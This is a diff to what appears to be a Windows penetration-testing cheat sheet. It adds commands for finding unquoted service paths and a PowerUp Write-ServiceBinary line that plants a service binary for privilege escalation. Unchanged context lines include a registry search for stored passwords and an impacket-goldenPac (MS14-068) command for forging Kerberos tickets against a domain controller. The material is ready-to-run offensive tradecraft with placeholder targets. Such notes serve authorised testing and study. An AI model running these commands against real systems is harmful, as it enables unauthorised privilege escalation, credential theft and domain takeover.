@@ -54,9 +54,18 @@ reg query HKCU /f password /t REG_SZ /s
 Find misconfigured services (default settings)
 ---
 ```powershell
-cmd /c wmic service get name,displayname,pathname,startmode | findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v "\`""
+cmd /c wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" |findstr /i /v "\`""
 ```
 
+#unquoted #service-privesc
+
+```powershell
+wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+```
+
+```powershell
+Write-ServiceBinary -Name '$SERVICE_NAME' -Path "C:\$UNQUOTED_PATH"
+```
 Golden ticket:
 ---
 generate user password hash:
@@ -92,7 +101,8 @@ GoldenPAC ms14-068
 impacket-goldenPac -dc-ip $TARGET_IP -target-ip $TARGET_IP '$DOMAIN/$USER:$PASSWORD@$MACHINE.$DOMAIN'
 ```
 
-Port scanning from PowerShell:
+Port scanning using PowerShell
+---
 
 Scan if single port is open:
 ```powershell
